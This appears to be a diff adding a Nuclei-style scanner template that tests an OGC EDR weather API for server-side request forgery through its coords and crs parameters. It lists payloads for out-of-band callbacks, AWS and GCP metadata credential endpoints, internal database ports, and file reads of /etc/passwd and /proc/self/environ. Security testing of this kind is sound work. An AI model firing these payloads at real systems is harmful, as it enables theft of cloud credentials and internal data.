@@ -1,0 +1,176 @@
+id: ogc-edr-ssrf-coords
+
+info:
+  name: OGC EDR API SSRF via coords and URL Parameters
+  author: weather-wms-security
+  severity: high
+  description: |
+    Tests for Server-Side Request Forgery (SSRF) vulnerabilities in EDR API
+    parameters. Targets include:
+    - coords parameter (WKT geometry that might be parsed and trigger requests)
+    - crs parameter (CRS URIs that might be resolved)
+    - Other URL-like parameters
+    
+    Uses HTTP-only interactsh for out-of-band detection (no DNS required).
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://ogcapi.ogc.org/edr/
+  tags: ssrf,oob,edr,ogc,api
+
+variables:
+  base_collection: "hrrr-surface"
+  base_param: "GUST"
+
+http:
+  # SSRF via coords parameter with interactsh
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "http://{{interactsh-url}}"
+        - "https://{{interactsh-url}}"
+        - "POINT(http://{{interactsh-url}} 0)"
+        - "http://{{interactsh-url}}/test"
+
+    attack: batteringram
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+  # SSRF via area coords
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/area?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "http://{{interactsh-url}}"
+        - "POLYGON((http://{{interactsh-url}} 0, 1 1, 1 0, 0 0))"
+
+    attack: batteringram
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+  # SSRF via crs parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords=POINT(-104.5 39.5)&parameter-name={{base_param}}&crs={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "http://{{interactsh-url}}/crs/EPSG/4326"
+        - "https://{{interactsh-url}}/def/crs"
+        - "http://{{interactsh-url}}"
+
+    attack: batteringram
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+  # AWS Metadata SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "http://169.254.169.254/latest/user-data"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "security-credentials"
+          - "AccessKeyId"
+        condition: or
+
+      - type: regex
+        regex:
+          - "ami-[a-f0-9]+"
+          - "i-[a-f0-9]+"
+
+  # GCP Metadata SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "http://metadata.google.internal/computeMetadata/v1/"
+        - "http://169.254.169.254/computeMetadata/v1/"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "project-id"
+          - "instance/zone"
+        condition: or
+
+  # Localhost/Internal SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "http://127.0.0.1/"
+        - "http://localhost/"
+        - "http://127.0.0.1:8080/"
+        - "http://127.0.0.1:5432/"
+        - "http://127.0.0.1:6379/"
+        - "http://[::1]/"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "PostgreSQL"
+          - "Redis"
+          - "MinIO"
+        condition: or
+
+  # File protocol SSRF (may work on some implementations)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "file:///etc/passwd"
+        - "file:///etc/hosts"
+        - "file:///proc/self/environ"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+          - "localhost"
+          - "PATH="
